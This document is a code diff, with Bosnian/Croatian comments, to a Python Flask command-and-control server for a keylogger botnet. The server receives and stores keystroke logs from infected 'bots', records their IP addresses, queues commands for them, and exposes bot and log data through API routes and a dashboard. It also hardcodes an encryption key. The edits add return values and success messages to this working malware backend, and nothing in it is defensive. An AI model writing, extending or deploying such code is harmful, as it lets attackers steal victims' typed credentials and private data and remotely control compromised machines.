@@ -32,7 +32,7 @@ logging.basicConfig(
 )
 
 # =====================================================================
-# ENKRIPCIJA - DIREKTAN KLJUČ
+# ENKRIPCIJA
 # =====================================================================
 MY_KEY = b'PLSiCRE32cI0ErE5vgqCtpGJzy5UO4h5D3UDwgbYJ-A='
 cipher = Fernet(MY_KEY)
@@ -65,9 +65,12 @@ def init_db():
         conn.commit()
         conn.close()
         print("[+] Database initialized successfully")
+        return True
     except Exception as e:
         print(f"[-] Database initialization error: {e}")
+        return False
 
+# INICIJALIZACIJA BAZE PRI STARTU
 init_db()
 
 # =====================================================================
@@ -97,8 +100,10 @@ def save_keylog(bot_id, data, timestamp):
         conn.commit()
         conn.close()
         print(f"[+] Keylog saved for {bot_id}")
+        return True
     except Exception as e:
         print(f"[-] Error saving keylog: {e}")
+        return False
 
 def save_bot(bot_id, timestamp, ip_address):
     try:
@@ -109,8 +114,10 @@ def save_bot(bot_id, timestamp, ip_address):
         conn.commit()
         conn.close()
         print(f"[+] Bot saved: {bot_id}")
+        return True
     except Exception as e:
         print(f"[-] Error saving bot: {e}")
+        return False
 
 def update_bot_last_seen(bot_id, timestamp):
     try:
@@ -119,8 +126,10 @@ def update_bot_last_seen(bot_id, timestamp):
         c.execute("UPDATE bots SET last_seen = ? WHERE bot_id = ?", (timestamp, bot_id))
         conn.commit()
         conn.close()
+        return True
     except Exception as e:
         print(f"[-] Error updating bot: {e}")
+        return False
 
 def get_recent_logs(limit=100):
     try:
@@ -186,8 +195,10 @@ def update_command_status(command_id, status, result=None):
             c.execute("UPDATE commands SET status = ? WHERE id = ?", (status, command_id))
         conn.commit()
         conn.close()
+        return True
     except Exception as e:
         print(f"[-] Error updating command status: {e}")
+        return False
 
 # =====================================================================
 # RUTE
@@ -232,6 +243,7 @@ def receive_keylog():
         update_bot_last_seen(bot_id, timestamp)
         
         logging.info(f"Keylog received from {bot_id} ({len(decoded_log)} chars) from {request.remote_addr}")
+        print(f"[+] SUCCESS: Keylog from {bot_id} saved!")
         
         return jsonify({"status": "ok", "message": "Data received"}), 200
         
@@ -287,7 +299,9 @@ def command_result():
 @app.route('/api/logs', methods=['GET'])
 def api_logs():
     try:
-        return jsonify({"logs": get_recent_logs(100)})
+        logs = get_recent_logs(100)
+        print(f"[*] API logs: returning {len(logs)} logs")
+        return jsonify({"logs": logs})
     except Exception as e:
         print(f"[-] Error in api_logs: {e}")
         return jsonify({"logs": [], "error": str(e)}), 500
@@ -295,7 +309,9 @@ def api_logs():
 @app.route('/api/bots', methods=['GET'])
 def api_bots():
     try:
-        return jsonify({"bots": get_all_bots()})
+        bots = get_all_bots()
+        print(f"[*] API bots: returning {len(bots)} bots")
+        return jsonify({"bots": bots})
     except Exception as e:
         print(f"[-] Error in api_bots: {e}")
         return jsonify({"bots": [], "error": str(e)}), 500
@@ -335,7 +351,7 @@ def api_send_command():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE
+# DASHBOARD TEMPLATE (ist kao prije)
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
